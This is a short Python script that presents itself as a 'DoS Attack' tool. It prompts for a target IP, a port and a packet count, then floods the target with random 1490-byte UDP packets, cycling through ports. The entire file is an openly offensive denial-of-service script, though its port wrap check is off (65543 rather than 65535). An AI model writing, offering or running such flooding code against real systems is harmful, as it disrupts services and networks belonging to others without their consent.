import os,sys,time
import socket
import random
soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
def Dos():
    os.system("figlet Dos Attack")
    host=input("[#] Enter Targer IP : ")	
    port=int(input("[#] Port : "))
    num=int(input("[#] How many times : "))
    print(30*"=")
    count=0
    for i in range(1,num+1):
                soc.sendto(bytes, (host,port))
                count+=1
                port+=1 
                print(f"\033[32m[~] Sent {count} packet to {host}  throught port {port} \033[0m ")
                if port == 65543:
                	port=1	              	      